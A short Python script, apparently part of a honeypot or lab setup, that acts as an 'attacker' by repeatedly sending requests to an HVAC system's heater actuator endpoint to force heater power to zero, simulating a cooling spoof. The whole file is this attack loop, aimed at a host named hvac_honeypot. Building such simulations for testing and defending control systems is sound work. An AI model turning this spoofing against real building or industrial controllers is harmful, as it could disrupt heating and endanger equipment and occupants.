#!/usr/bin/env python3
# attacker/cooling_spoof.py
import requests, time

BASE="http://hvac_honeypot:5000"
ROLE="attacker"

def spoof(rate=4, duration=20):
    interval = 1.0/max(1,rate)
    end = time.time() + duration
    while time.time() < end:
        try:
            # Simulate cooling spoof by setting heater power to 0.0
            r = requests.post(BASE+"/actuator/heater", json={"power": 0.0, "role": ROLE}, timeout=2)
        except:
            pass
        time.sleep(interval)

if __name__ == "__main__":
    spoof()